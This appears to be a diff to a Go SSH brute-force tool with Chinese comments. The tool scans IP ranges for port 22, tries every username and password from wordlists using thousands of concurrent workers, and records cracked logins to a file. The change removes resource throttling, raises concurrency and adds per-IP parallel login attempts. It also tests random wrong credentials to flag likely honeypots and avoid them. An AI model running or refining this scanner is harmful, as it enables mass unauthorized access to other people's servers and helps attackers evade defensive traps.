@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"context"
 	"flag"
 	"fmt"
 	"math/rand"
@@ -11,34 +12,25 @@ import (
 	"sync"
 	"time"
 
-	"github.com/shirou/gopsutil/cpu"
-	"github.com/shirou/gopsutil/mem"
 	"golang.org/x/crypto/ssh"
 )
 
 const (
-	port       = "22"
-	timeout    = 3 * time.Second
-	ipFilename = "ip.txt"
-	userFile   = "user.txt"
-	passFile   = "passwd.txt"
-	resultFile = "success.txt"
-)
-
-var (
-	baseScanWorkers = 500
-	baseAuthWorkers = 200
-	maxWorkers      = 10000
-
-	scanWorkerCh = make(chan int, 1)
-	authWorkerCh = make(chan int, 1)
+	port                  = "22"
+	timeout               = 1 * time.Second
+	ipFilename            = "ip.txt"
+	userFile              = "user.txt"
+	passFile              = "passwd.txt"
+	resultFile            = "success.txt"
+	scanWorkers           = 10000
+	authWorkers           = 10000
+	authWorkersPerIP      = 50
+	honeypotTestRounds    = 3
 )
 
 func init() {
 	flag.Parse()
 	rand.Seed(time.Now().UnixNano())
-	scanWorkerCh <- baseScanWorkers
-	authWorkerCh <- baseAuthWorkers
 }
 
 func main() {
@@ -59,24 +51,21 @@ func main() {
 
 	var scanWg, authWg sync.WaitGroup
 
-	// 啟動監控系統資源
-	go monitorAndAdjust()
-
-	// 掃描任務
+	// 啟動掃描工作池
 	go func() {
 		startScanPool(ipChan, openIPs, &scanWg)
 		scanWg.Wait()
 		close(openIPs)
 	}()
 
-	// 認證任務
+	// 啟動認證工作池
 	go func() {
 		startAuthPool(openIPs, users, passwords, success, &authWg)
 		authWg.Wait()
 		close(success)
 	}()
 
-	// 寫入成功結果
+	// 處理成功結果
 	out, err := os.OpenFile(resultFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("無法寫入結果文件:", err)
@@ -92,132 +81,137 @@ func main() {
 	fmt.Println("掃描結束")
 }
 
-func monitorAndAdjust() {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-
-	for range ticker.C {
-		cpuPercents, _ := cpu.Percent(0, false)
-		memStats, _ := mem.VirtualMemory()
-		cpuUsage := cpuPercents[0]
-		memUsage := memStats.UsedPercent
-
-		fmt.Printf("[監控] CPU: %.2f%%, MEM: %.2f%%\n", cpuUsage, memUsage)
-
-		if cpuUsage > 80 || memUsage > 80 {
-			scanWorkerCh <- max(baseScanWorkers/2, 100)
-			authWorkerCh <- max(baseAuthWorkers/2, 50)
-		} else {
-			scanWorkerCh <- min(baseScanWorkers*2, maxWorkers)
-			authWorkerCh <- min(baseAuthWorkers*2, maxWorkers)
-		}
-	}
-}
-
 func startScanPool(ipChan <-chan string, openIPs chan<- string, wg *sync.WaitGroup) {
-	for {
-		select {
-		case count := <-scanWorkerCh:
-			fmt.Println("[更新] 掃描併發數調整為:", count)
-			for i := 0; i < count; i++ {
-				wg.Add(1)
-				go func() {
-					defer wg.Done()
-					for ip := range ipChan {
-						if isOpen(ip, port) {
-							openIPs <- ip
-						} else {
-							fmt.Printf("[-] %s 無法連接 22 端口\n", ip)
-						}
-					}
-				}()
+	for i := 0; i < scanWorkers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for ip := range ipChan {
+				if isOpen(ip, port) {
+					openIPs <- ip
+				} else {
+					fmt.Printf("[-] %s 無法連接 22 端口\n", ip)
+				}
 			}
-			return
-		}
+		}()
 	}
 }
 
 func startAuthPool(openIPs <-chan string, users, passwords []string, success chan<- string, wg *sync.WaitGroup) {
-	for {
-		select {
-		case count := <-authWorkerCh:
-			fmt.Println("[更新] 登錄併發數調整為:", count)
-			for i := 0; i < count; i++ {
-				wg.Add(1)
-				go func() {
-					defer wg.Done()
-					for ip := range openIPs {
-						if loginSSH(ip, users, passwords, success) {
-							continue
-						}
-					}
-				}()
+	for i := 0; i < authWorkers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for ip := range openIPs {
+				if loginSSHConcurrent(ip, users, passwords, success) {
+					// 目標IP已處理，繼續下一IP
+					continue
+				}
 			}
-			return
-		}
+		}()
 	}
 }
 
-func loginSSH(ip string, users, passwords []string, success chan<- string) bool {
-	for _, user := range users {
-		for _, pass := range passwords {
-			config := &ssh.ClientConfig{
-				User:            user,
-				Auth:            []ssh.AuthMethod{ssh.Password(pass)},
-				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-				Timeout:         timeout,
-			}
-			conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
-			if err != nil {
-				continue
-			}
-			sshConn, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(ip, port), config)
-			if err != nil {
-				conn.Close()
-				fmt.Printf("[-] %s 登錄失敗 (%s/%s)\n", ip, user, pass)
-				continue
-			}
-			client := ssh.NewClient(sshConn, chans, reqs)
+// loginSSHConcurrent 對單個 IP 使用多線程嘗試所有帳密組合，
+// 第一個成功後取消其餘任務，並進行蜜罐檢測。
+func loginSSHConcurrent(ip string, users, passwords []string, success chan<- string) bool {
+	type cred struct{ user, pass string }
+	tasks := make(chan cred)
+	ctx, cancel := context.WithCancel(context.Background())
+	var wg sync.WaitGroup
+	var successOnce sync.Once
+	var found bool
 
-			honeypotCount := 0
-			for i := 0; i < 3; i++ {
-				fakeUser := users[rand.Intn(len(users))]
-				fakePass := passwords[rand.Intn(len(passwords))]
-				if fakeUser == user && fakePass == pass {
-					fakePass = fakePass + "_wrong"
-				}
-				fakeConfig := &ssh.ClientConfig{
-					User:            fakeUser,
-					Auth:            []ssh.AuthMethod{ssh.Password(fakePass)},
-					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-					Timeout:         timeout,
-				}
-				fakeConn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
-				if err != nil {
-					continue
-				}
-				fakeSSHConn, _, _, err := ssh.NewClientConn(fakeConn, net.JoinHostPort(ip, port), fakeConfig)
-				if err == nil {
-					honeypotCount++
-					fmt.Printf("[!] %s 測試 %d/3 錯誤登入成功 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
-					fakeSSHConn.Close()
-				} else {
-					fmt.Printf("[-] %s 測試 %d/3 錯誤登入被拒 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
+	// 啟動 per-IP 認證工作池
+	for i := 0; i < authWorkersPerIP; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case task, ok := <-tasks:
+					if !ok {
+						return
+					}
+					// 嘗試 SSH 登錄
+					if trySSHLogin(ip, task.user, task.pass) {
+						successOnce.Do(func() {
+							found = true
+							// 蜜罐檢測
+							honeypotCount := 0
+							for i := 0; i < honeypotTestRounds; i++ {
+								fakeUser := users[rand.Intn(len(users))]
+								fakePass := passwords[rand.Intn(len(passwords))]
+								if fakeUser == task.user && fakePass == task.pass {
+									fakePass += "_wrong"
+								}
+								if trySSHLogin(ip, fakeUser, fakePass) {
+									honeypotCount++
+									fmt.Printf("[!] %s 測試 %d/\u003d3 錯誤登入成功 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
+								} else {
+									fmt.Printf("[-] %s 測試 %d/\u003d3 錯誤登入被拒 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
+								}
+							}
+							successMsg := fmt.Sprintf("%s@%s 密碼: %s", task.user, ip, task.pass)
+							if honeypotCount == honeypotTestRounds {
+								successMsg += " [可能為蜜罐：連續3次錯誤帳密皆可登入]"
+							}
+							fmt.Printf("[+] %s 登錄成功 (%s/%s)\n", ip, task.user, task.pass)
+							success <- successMsg
+							// 取消其餘嘗試
+							cancel()
+						})
+						return
+					} else {
+						fmt.Printf("[-] %s 登錄失敗 (%s/%s)\n", ip, task.user, task.pass)
+					}
 				}
 			}
-
-			successMsg := fmt.Sprintf("%s@%s 密碼: %s", user, ip, pass)
-			if honeypotCount == 3 {
-				successMsg += " [可能為蜜罐：連續3次錯誤帳密皆可登入]"
-			}
-			fmt.Printf("[+] %s 登錄成功 (%s/%s)\n", ip, user, pass)
-			success <- successMsg
-			client.Close()
-			return true
-		}
+		}()
 	}
-	fmt.Printf("[-] %s 所有帳密組合失敗\n", ip)
-	return false
+
+	// 分配任務
+	go func() {
+		defer close(tasks)
+		for _, u := range users {
+			for _, p := range passwords {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+					tasks <- cred{u, p}
+				}
+			}
+		}
+	}()
+
+	wg.Wait()
+	cancel()
+	return found
+}
+
+// trySSHLogin 嘗試單次 SSH 連接並釋放資源
+func trySSHLogin(ip, user, pass string) bool {
+	config := &ssh.ClientConfig{
+		User:            user,
+		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout:         timeout,
+	}
+
+	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+
+	_, _, _, err = ssh.NewClientConn(conn, net.JoinHostPort(ip, port), config)
+	if err != nil {
+		return false
+	}
+	return true
 }
 
 func isOpen(ip, port string) bool {
@@ -278,18 +272,5 @@ func inc(ip net.IP) {
 			break
 		}
 	}
-}
-
-func min(a, b int) int {
-	if a < b {
-		return a
-	}
-	return b
-}
-func max(a, b int) int {
-	if a > b {
-		return a
-	}
-	return b
 }
 
